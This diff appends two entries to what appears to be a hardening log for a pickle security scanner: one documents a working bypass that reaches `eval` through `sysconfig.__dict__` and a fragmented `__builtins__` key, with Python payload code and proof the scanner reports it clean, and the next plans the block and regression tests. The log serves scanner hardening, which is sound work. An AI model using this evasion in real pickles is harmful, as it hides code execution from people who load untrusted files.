@@ -8056,3 +8056,108 @@ Performance note: the new checks are constant-time/prefix checks plus one
 binary search over the already sorted dangerous-global table to decide whether
 a module has exact dangerous globals. They add no imports, no package
 enumeration, no source parsing, and no call-graph traversal.
+
+## Turn 145 - Bypass via clean module `__dict__` to fragmented `__builtins__`
+
+Found a scanner-clean direct RCE that bypasses the Turn 144 module-dictionary
+scope. The current block treats `module.__dict__` as critical only when that
+module already has exact dangerous globals in the Rust table. A clean-looking
+module dictionary is still enough to recover the builtin namespace because
+normal Python modules expose `__builtins__` in their globals.
+
+The payload imports `sysconfig.__dict__`, reconstructs the key
+`__builtins__` from fragments that never contain a contiguous double-underscore
+token, then recovers `eval` from that builtin dictionary:
+
+```python
+module_dict = sysconfig.__dict__
+builtins_key = "".join(["_", "_", "builtins", "_", "_"])
+builtins_dict = dict.get(module_dict, builtins_key)
+eval_key = "".join(["ev", "al"])
+fn = dict.get(builtins_dict, eval_key)
+code = "".join(
+    [
+        "open('/tmp/.../fragmented_module_builtins_marker",
+        "', 'w').write('owned-by-fragmented-module-builtins')",
+    ]
+)
+fn(code)
+```
+
+The active pickle imports only:
+
+- `sysconfig.__dict__`
+- `builtins.str.join`
+- `builtins.dict.get`
+- `builtins.str.join`
+- `builtins.dict.get`
+- `builtins.str.join`
+
+Proof on CPython 3.12.12:
+
+- Control payload scanner result: `len=199`, `status=complete`,
+  `verdict=clean`, `findings=[]`, `notices=[]`.
+- Control import references: one clean `builtins.str.join`.
+- Control runtime: `pickle.loads(control)` returns the assembled eval code
+  string and creates no marker.
+- Active payload scanner result: `len=376`, `status=complete`,
+  `verdict=clean`, `findings=[]`, `notices=[]`.
+- Active import references: `sysconfig.__dict__`, three
+  `builtins.str.join` references, and two `builtins.dict.get` references, all
+  with `is_dangerous=False`.
+- Active runtime before unpickle: marker absent.
+- Active runtime after unpickle: marker exists and contains
+  `owned-by-fragmented-module-builtins`; `pickle.loads(active)` returns the
+  integer byte count from `open(...).write(...)`.
+
+Why the scanner missed it:
+
+- `sysconfig` is neither wildcard-dangerous nor present in the exact
+  dangerous-global table, so the Turn 144 `module.__dict__` recovery check does
+  not fire.
+- The dangerous builtin namespace is recovered from the module globals through
+  a fragmented `__builtins__` key. No single string literal contains
+  `__builtins__`, `eval`, `eval(`, `exec`, `getattr`, `import`, `os.system`, or
+  a subprocess pattern.
+- `builtins.dict.get` and `builtins.str.join` remain clean primitives, so the
+  scanner sees only ordinary mapping lookup and string assembly.
+- The Python call-graph pass has no model for dataflow from a module globals
+  dictionary to a recovered builtin function that is later invoked by `REDUCE`.
+
+Performance note: the next block should treat module namespace dictionaries as
+source-level dynamic global recovery primitives regardless of whether the
+apparent module already has exact dangerous globals. Direct
+`module.__builtins__` should also be critical for the same reason. This can
+remain a bounded name check over parsed global operands (`__dict__`,
+`__dict__.*`, and `__builtins__` / `__builtins__.*`) with no imports, no module
+enumeration, and no call-graph traversal.
+
+## Turn 146 - Block module namespace and `__builtins__` recovery
+
+Blocking plan:
+
+- Treat `__dict__` and `__dict__.*` as critical for any apparent module, not
+  only modules with exact dangerous globals. A module globals dictionary is a
+  dynamic global-recovery primitive because it normally contains
+  `__builtins__`.
+- Treat `__builtins__` and `__builtins__.*` as critical for any apparent
+  module. Direct `module.__builtins__` can expose the builtin dictionary or
+  module even when the pickle never imports `builtins`.
+- Keep the existing `os.path` carveout first, so benign `os.path` access
+  behavior stays unchanged.
+- Add a CPython oracle regression for the Turn 145 payload. The control payload
+  only assembles the eval code string and stays clean; the active payload
+  imports `sysconfig.__dict__`, reconstructs `__builtins__` and `eval` through
+  clean `str.join`/`dict.get` primitives, is flagged as malicious, and still
+  writes the marker if loaded.
+- Add a direct `sysconfig.__builtins__` regression to cover the non-fragmented
+  namespace exposure path.
+- Add Rust unit coverage for `sysconfig.__dict__`,
+  `sysconfig.__dict__.get`, `sysconfig.__builtins__`, and
+  `sysconfig.__builtins__.get`, plus builtin-module aliases.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: this removes the previous per-module table lookup and
+replaces it with constant string-prefix checks over the parsed global name. It
+adds no imports, no package enumeration, no source parsing, and no call-graph
+traversal.
